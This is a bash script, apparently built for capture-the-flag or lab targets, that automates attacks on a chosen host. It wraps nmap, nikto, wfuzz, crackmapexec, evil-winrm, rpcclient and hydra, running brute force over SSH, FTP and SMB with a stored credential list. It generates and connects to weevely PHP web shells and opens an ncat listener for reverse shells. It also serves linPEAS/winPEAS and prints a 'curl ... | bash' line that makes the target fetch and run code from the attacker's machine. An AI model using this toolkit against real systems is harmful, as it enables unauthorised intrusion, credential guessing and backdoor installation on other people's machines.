#!/bin/bash
# Remeber to use: https://www.shellcheck.net
set -euo pipefail
IFS=$'\n\t'

# Uncomment for Debugging
#set -x

prompt() {
  read -p "Run command? (y/N): " -n 1 -r
  echo
  if [[ ! "$REPLY" =~ ^[Yy]$ ]]; then
    exit
  fi
}

show_help() {
  echo -e "\n[ FOXACID || Commando Script ][ Doomguy: https://github.com/doomguy ]\n"
  echo "Available commands:"
  grep "^##" "$0" | cut -d' ' -f2- | while IFS= read -r cmd; do
    echo -e "  fxy $cmd"
  done | sort
}

checkCmd() {
  if [ ! "$(which "$CMD")" ]; then
    echo "[!] '$CMD' required but missing."
    exit
  fi
}

getIP() {
  if ip a | grep -q "tun0"; then
    DEV="tun0"
  else
    DEV="eth0"
  fi

  IP=$(ip -4 addr show "$DEV" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
  echo "$IP"
}

showCreds() {
  FILE="creds.txt"
  echo "Available creds:"
  echo "     0  (Use for NULL sessions)"
  if [ -e "$FILE" ]; then
    column -t -s':' "$FILE" | cat -n
  else
    echo -e "\n[*] No '$FILE' found!"
  fi
  exit
}

getCreds() {
  if [ "$CID" -eq 0 ]; then
    USRNME="NULL"
    PASSWD="NULL"
  else
    FILE="creds.txt"
    if [ ! -e "$FILE" ]; then
      echo "[!] No '$FILE' found!"; exit
    fi
    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ]; then
      echo "[!] Invalid credential ID!"; exit
    fi

    USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
    PASSWD=$(sed -n "${CID}p" "$FILE" | cut -d':' -f2)
  fi
}

createUserPassLists() {
  FILE="creds.txt"
  if [ ! -e "$FILE" ]; then
    echo "[!] No '$FILE' found!"; exit
  fi
  FPATH="/dev/shm/.fxy"
  if [ ! -d "$FPATH" ]; then
    mkdir "$FPATH"
  fi
  # userlist
  if [ "$(which "genuserlst.py")" ]; then
    genuserlst.py "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u > "$FPATH/user.lst"
  else
    echo "[*] Did not find 'genuserlst.py' in PATH. Falling back to standard mode."
    cut -d: -f1 "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u | grep -v ^$ > "$FPATH/user.lst"
  fi
  # passlist
  cut -d: -f2 "$FILE" | sort -u | grep -v ^$ > "$FPATH/pass.lst"
}

getMachinePass() {
  PASSWD="$(echo -n "$(hostname)$(cat /sys/class/net/*/address | head -n1)" | sha256sum | cut -c1-20)"
}

## h(elp)\t\t\t\t\t: Show this help
if [ ! "$#" -ge 1 ] || [ "$1" == "h" ] || [ "$1" == "help" ]|| [ "$1" == "-h" ] || [ "$1" == "-?" ]; then
  show_help
  exit
fi

## r(host) [target]\t\t\t\t: Show/Set RHOST
# Set RHOST
if [ "$#" -eq 2 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
  FPATH="/dev/shm/.fxy"
  FILE="/dev/shm/.fxy/rhost"
  if [ "$#" -eq 2 ]; then
    if [ ! -d "$FPATH" ]; then
      mkdir "$FPATH"
    fi
    echo "$2" > $FILE
  else
    echo "[!] You need to supply an IP or hostname as second argument!"
  fi
  exit
fi

# Load RHOST from cache
FILE="/dev/shm/.fxy/rhost"
if [ -f $FILE ]; then
  RHOST="$(cat $FILE)"
  export RHOST

  if [ -z "$RHOST" ]; then
     echo "Something went wrong on loading '$FILE'"
     exit
  fi
else
  echo "RHOST is not defined!"
  exit
fi

# Show RHOST
if [ "$#" -eq 1 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
  echo "  RHOST: $RHOST"
  exit
fi

## creds [add user:pass] [del cid]\t\t: Show/Add/Del creds
if [ "$1" == "creds" ]; then
  FILE="creds.txt"
  if [ "$#" -eq 1 ]; then
    showCreds; exit
  elif [ "$2" == "add" ] && [ "$#" -eq 3 ]; then
    # add entry
    ENTRY="$3"
    if [[ ! "$ENTRY" =~ .*:$ ]]; then
      ENTRY="$ENTRY:"
    fi
    CMD="echo '$ENTRY' >> $FILE"
  elif [ "$2" == "del" ] && [ "$#" -eq 3 ]; then
    # del entry
    CID="$3"
    if [ ! -e "$FILE" ]; then
      echo "[!] No '$FILE' found!"; exit
    fi
    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ] || [ "$CID" -eq 0 ]; then
      echo "[!] Invalid credential ID!"; exit
    fi
    CMD="sed -i '${CID}d' $FILE"
  fi
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## pass(word)\t\t\t\t: Show machine password
if [ "$#" -eq 1 ] && { [ "$1" == "pass" ] || [ "$1" == "password" ]; }; then
  getMachinePass
  echo "  PASS: $PASSWD"
  exit
fi

## httpd|ws [port]\t\t\t\t: python3 -m http.server PORT
if [ "$1" == "httpd" ] || [ "$1" == "ws" ] ; then
  CMD="python3 -m http.server"
  PORT="80"
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  fi
  CMD="$CMD $PORT"
  echo "URL: http://$(getIP)/"
  echo "DIR: $(pwd)"
  for f in $(find . -maxdepth 1 -type f 2>/dev/null | sed 's,\./,,' | sed 's, ,+,'); do
    echo "- http://$(getIP)/$f";
  done
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## l(isten) [port]\t\t\t\t: ncat -vlkp PORT
if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
  CMD="ncat"; checkCmd
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  else
    PORT="9001"
  fi
  CMD="$CMD -vlkp $PORT"
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## n(map) [full]\t\t\t\t: nmap -v -A (-p-) RHOST | tee
if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
  CMD="nmap"; checkCmd
  if [ "$#" -eq 2 ] && [ "$2" == "full" ]; then
    CMD="$CMD -p-"
  fi
  CMD="$CMD -v -A $RHOST -oA ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S)"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## nikto [s|ssl|tls] [subdir]\t\t: nikto -host PROTO://RHOST+SUBDIR | tee
if [ "$1" == "nikto" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD -host $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## cme [smb]\t\t\t\t\t: crackmapexec smb RHOST | tee
if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
  CMD="crackmapexec"; checkCmd
  if [ "$#" -eq 2 ] && [ "$2" == "smb" ]; then
    CMD="$CMD smb"
  else
    exit
  fi
  CMD="$CMD $RHOST | tee ${RHOST}_cme_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## dirb [s|ssl|tls] [subdir]\t\t\t: dirb PROTO://RHOST+SUBDIR | tee
if [ "$1" == "dirb" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## curl [s|ssl|tls] [subdir]\t\t\t: curl -si PROTO://RHOST+SUBDIR | less
if [ "$1" == "curl" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD -ski $PROTO://${RHOST}${SUBDIR} | less"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## p(ing) [count]\t\t\t\t: ping -c COUNT RHOST
if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
  CMD="ping"; checkCmd

  if [ "$#" -eq 2 ]; then
    CMD="$CMD -c $2"
  fi

  CMD="$CMD $RHOST"
  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## smbpasswd [cid]\t\t\t\t: smbpasswd -r RHOST -U :cid_user
if [ "$1" == "smbpasswd" ]; then
  CMD="$1"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -eq 2 ]; then
    CID="$2"
    getCreds
  fi

  CMD="$CMD -r $RHOST -U $USRNME"
  echo "Password: $PASSWD"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## (evil-)winrm [cid]\t\t\t: evil-winrm -i RHOST -u :cid_user -p :cid_pass
if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
  CMD="evil-winrm"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -eq 2 ]; then
    CID="$2"
    getCreds
  fi

  CMD="$CMD -i $RHOST -u '$USRNME' -p '$PASSWD'"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## peas [version] [port]\t\t\t: Download *peas and serve via http.server
if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy peas lin"
  echo "  fxy peas winbat"
  echo "  fxy peas winany"
  echo "  fxy peas win86"
  echo "  fxy peas win64"
  exit
fi

if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
  echo "Download *peas and serve via http.server?"
  prompt

  FPATH="/dev/shm/.fxy/peas"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH"

  case "$2" in
    "lin" )      wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh" ;;
    "winbat")    wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat' -O "$FPATH/winPEAS.bat" ;;
    "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
    "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
    "win64")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O "$FPATH/winPEASx64.exe" ;;
    *)           echo "[!] Error parsing PEAS version for download!"; exit ;;
  esac

  PORT="80"
  if [ "$#" -eq 3 ]; then
    PORT="$3"
  fi

  CMD="python3 -m http.server $PORT"
  echo "$(tput bold)Run this on your target:"

  case "$2" in
    "lin" )      echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_"'$(whoami).log' ;;
    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat" ;;
    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe" ;;
    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe" ;;
    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe"  ;;
    *)           echo "[!] Error parsing PEAS version for help text!"; exit ;;
  esac

  echo "$(tput sgr0) "
  echo "> $CMD"
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi

## wfuzz\t\t\t\t\t: wfuzz | tee
# wfuzz help
if [ "$1" == "wfuzz" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy wfuzz vhost [s|ssl|tls] [domain] [hw] [hc]"
  echo "  fxy wfuzz [s|ssl|tls] [subdir] [hw] [hc]"
  exit
fi

# wfuzz vhost
if [ "$1" == "wfuzz" ] && [ "$2" == "vhost" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  DOMAIN="$RHOST"
  if [ "$#" -ge 3 ]; then
    # https?
    if [ "$3" == "s" ] || [ "$3" == "ssl" ] || [ "$3" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -ge 4 ] && [ "$PROTO" == "https" ]; then
      DOMAIN="$4"
    elif [ "$#" -ge 3 ] && [ "$PROTO" == "http" ]; then
      DOMAIN="$3"
    fi
  fi

  # Setup tmp path and wordlist
  FPATH="/dev/shm/.fxy/wfuzz"
  if [ ! -d "$FPATH" ]; then
    mkdir -p "$FPATH"
  fi
  cd "$FPATH"
  if [ ! -f "subdomains-top1million-20000.txt" ]; then
    wget 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt' -O subdomains-top1million-20000.txt
  fi

  HW=""; HC=""
  if [ "$#" -eq 4 ] && [ "$PROTO" == "http" ];  then HW="--hw $4"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "http" ];  then HW="--hw $4"; HC="--hc $5"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; fi
  if [ "$#" -eq 6 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; HC="--hc $6"; fi

  CMD="wfuzz -H 'Host: FUZZ.$DOMAIN' -u '$PROTO://$RHOST' -w $FPATH/subdomains-top1million-20000.txt $HW $HC"
  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_vhost_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi

# wfuzz normal
if [ "$1" == "wfuzz" ] && [ "$2" != "vhost" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUB="/"
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi

    if [ "$#" -ge 3 ] && [ "$PROTO" == "https" ]; then
      SUB="$3"
    elif [ "$#" -ge 2 ] && [ "$PROTO" == "http" ]; then
      SUB="$2"
    fi
  fi

  HW=""; HC=""
  if [ "$#" -eq 3 ] && [ "$PROTO" == "http" ];  then HW="--hw $3"; fi
  if [ "$#" -eq 4 ] && [ "$PROTO" == "http" ];  then HW="--hw $3"; HC="--hc $4"; fi
  if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then HW="--hw $4"; fi
  if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then HW="--hw $4"; HC="--hc $5"; fi

  CMD="wfuzz -u '$PROTO://${RHOST}${SUB}' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt $HW $HC"
  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  rm -rf "$FPATH"
  exit
fi

## cewl [s|ssl|tls] [subdir]\t\t\t: cewl PROTO://RHOST+SUBDIR -w RHOST_cewl.txt
if [ "$1" == "cewl" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi
    # subdir?
    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR} -w ${RHOST}_cewl.txt"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## ssh [cid] [port]\t\t\t\t: sshpass -e ssh :cid_user@RHOST -p PORT
if [ "$1" == "ssh" ]; then
  if [ ! "$(which sshpass)" ]; then
    echo "[!] 'sshpass' required but missing."
    CMD="sudo apt install sshpass"
    echo "> $CMD"
    prompt
    bash -c "$CMD"
  fi

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -ge 2 ]; then
    CID="$2"
    getCreds
  fi

  export SSHPASS=$PASSWD
  CMD="sshpass -v -e ssh -o StrictHostKeyChecking=no $USRNME@$RHOST"

  # port?
  if [ "$#" -eq 3 ]; then
    PORT="$3"
    CMD="$CMD -p $PORT"
  fi

  echo "> $CMD"
  bash -c "$CMD"
  exit
fi

## nfs|showmount\t\t\t\t: showmount -e RHOST
if [ "$1" == "nfs" ] || [ "$1" == "showmount" ]; then
  CMD="showmount"; checkCmd
  CMD="showmount -e $RHOST"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## (i)conv|convert [file]\t\t\t: iconv -f UTF-16LE -t UTF-8 FILE -o FILE.conv
if { [ "$1" == "iconv" ] || [ "$1" == "conv" ] || [ "$1" == "convert" ]; } && [ "$#" -eq 2 ]; then
  CMD="iconv"; checkCmd

  FILE="$2"
  if [ ! -f "$FILE" ]; then
    echo "[!] Invalid input file!"; exit
  fi

  CMD="iconv -f UTF-16LE -t UTF-8 $FILE -o $FILE.conv"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## weevely [gen|help]\t\t\t: weevely php shell
# weevely help
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "help" ]; then
  echo "Available commands:"
  echo "  fxy weevely gen [file] [password]"
  echo "  fxy weevely [s|ssl|tls] [subdir] [file] [password]"
  exit
fi

# weevely generate
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  getMachinePass
  # filename?
  if [ "$#" -eq 3 ]; then
    FILE="$3"
  fi
  # pasword?
  if [ "$#" -eq 4 ]; then
    PASSWD="$4"
  fi
  CMD="$CMD generate $PASSWD $FILE"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

# weevely connect mode
if [ "$1" == "weevely" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi
    # subdir?
    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
    # filename?
    if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then
      FILE="$4"
    elif [ "$#" -eq 3 ] && [ "$PROTO" == "http" ]; then
      FILE="$3"
    fi
    # password?
    if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then
      PASSWD="$5"
    elif [ "$#" -eq 4 ] && [ "$PROTO" == "http" ]; then
      PASSWD="$4"
    fi
  fi
  getMachinePass
  CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## rpc(client) [cid] [domain] [cmd]\t\t: rpcclient
#rpcclient -A auth.txt -W domain.local 10.10.10.193 -c "enumdomusers" > out.txt
if [ "$1" == "rpc" ] || [ "$1" == "rpcclient" ]; then
  CMD="rpcclient"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -ge 2 ]; then
    # NULL session?
    if [ "$2" -eq 0 ]; then
      CMD="$CMD -U '' -N"
    else
      CID="$2"
      getCreds
      CMD="$CMD -U '$USRNME%$PASSWD'"
    fi
  fi

  # workgroup?
  WRKGRP=""
  if [ "$#" -ge 3 ]; then
    WRKGRP="-W $3"
  fi

  # command?
  CMND=""
  if [ "$#" -ge 4 ]; then
    CMND="-c $4 | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$4_$(date +%F_%H%M%S).log"
  fi

  CMD="$CMD $WRKGRP $RHOST $CMND"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi

## hydra [service] [port] [username]\t\t: hydra brute force (ssh, ftp, smb)
# hydra help
if [ "$1" == "hydra" ] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy hydra ssh [port] [username]"
  echo "  fxy hydra ftp [port] [username]"
  echo "  fxy hydra smb [port] [username]"
  #echo "  fxy hydra http [url] [username]"
  exit
fi

# hydra -I -L user.lst -P pass.lst -u -e sr -s 22333 127.0.0.1 ssh
# hydra -I -L user.lst -P pass.lst -u -e sr -s 21 127.0.0.1 ftp
# hydra -I -L user.lst -P pass.lst -u -e sr -s 445 127.0.0.1 smb
if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
  CMD="hydra"; checkCmd
  createUserPassLists
  FPATH="/dev/shm/.fxy"

  case "$2" in
    "ssh" )   PORT="-s 22"; SVC="ssh" ;;
    "ftp")    PORT="-s 21"; SVC="ftp" ;;
    "smb")    PORT="-s 445"; SVC="smb" ;;
    *)        echo "[!] Error parsing service to attack!"; exit ;;
  esac

  if [ "$#" -ge 3 ]; then
    PORT="-s $3"
  fi

  if [ "$#" -ge 4 ]; then
    USRNME="-l $4"
  else
    USRNME="-L $FPATH/user.lst"
  fi

  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC"
  echo "> $CMD"
  prompt
  bash -c "$CMD"
  exit
fi


# fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
# hydra ssh ftp basicauth smb
# msf multi handler
# msf venom most common
# smbclient
# smbmap
# enum4linux

# Nothing found? Invalid command?
show_help; exit
